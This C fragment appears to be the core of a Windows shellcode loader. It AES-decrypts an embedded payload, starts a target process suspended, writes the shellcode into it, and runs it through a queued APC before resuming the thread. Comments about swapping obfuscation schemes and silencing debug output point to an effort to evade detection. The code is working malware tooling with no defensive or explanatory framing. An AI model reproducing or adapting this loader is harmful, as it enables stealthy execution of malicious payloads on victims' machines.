	HANDLE hProcess = NULL, hThread = NULL;
	DWORD dwProcessId = NULL;
	PVOID pAddress = NULL;
	PBYTE Payload = NULL;
	DWORD PayloadSize = 0;  // Changed from SIZE_T to DWORD to match SimpleDecryption

	// AES Decryption (replacing IPv4Deobfuscation)
	if (!SimpleDecryption(
		AesCipherText,          // Encrypted shellcode data
		sizeof(AesCipherText),  // Size of encrypted data
		AesKey,                 // 32-byte AES key
		AesIv,                  // 16-byte IV
		(PVOID*)&Payload,       // Output: decrypted shellcode buffer
		&PayloadSize            // Output: size of decrypted shellcode
	)) {
		// Error handling for failed decryption
		printf("[!] AES Decryption Failed\n");
		return -1;  // This was missing
	}

	//printf("[+] AES Decryption Successful\n");
	//printf("[+] Decrypted shellcode size: %lu bytes\n", PayloadSize);

	if (!CreateSuspendedProcess2(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		printf("[!] Failed to create suspended process\n");
		HeapFree(GetProcessHeap(), 0, Payload);
		return -1;
	}

	//printf("[+] Created suspended process: PID=%lu\n", dwProcessId);

	if (!InjectShellcodeToRemoteProcess(hProcess, Payload, PayloadSize, &pAddress)) {
		printf("[!] Failed to inject shellcode\n");
		HeapFree(GetProcessHeap(), 0, Payload);
		CloseHandle(hProcess);
		CloseHandle(hThread);
		return -1;
	}

	//printf("[+] Shellcode injected at address: 0x%p\n", pAddress);

	QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);
	Sleep(1000);
	ResumeThread(hThread);

	printf("executed\n");

	HeapFree(GetProcessHeap(), 0, Payload);
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
